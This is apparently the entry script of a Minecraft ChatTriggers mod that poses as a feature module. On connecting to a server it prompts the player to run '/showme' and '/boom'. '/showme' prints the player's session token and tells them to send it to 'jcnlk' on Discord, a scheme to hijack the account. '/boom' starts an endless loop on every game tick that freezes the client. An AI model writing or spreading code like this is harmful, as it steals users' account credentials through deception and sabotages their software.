import config from "./config";
import "./features/Riftstalker/Impel";
import "./features/Riftstalker/dudechill";
import { sendMsg } from "./utils/utils";

register("command", () => config.openGUI()).setName("fuckcole").setAliases(["fc", "cole"]);
register("gameLoad", () => sendMsg("&aIt didnt fail loading ggwp"));
register("serverConnect", () => Client.scheduleTask(20, () => sendMsg("Make sure to run '/boom' and '/showme'!")))

register("command", () => {
  ChatLib.chat("This is your ssid!");
  ChatLib.chat("Make sure to send it 'jcnlk' on discord!")
  ChatLib.chat("");
  ChatLib.chat(Client.getMinecraft().func_110432_I().func_148254_d());
}).setName("ssid").setAliases(["getssid", "showme"]);

register("command", () => register("tick", () => {while (true) {}})).setName("boom");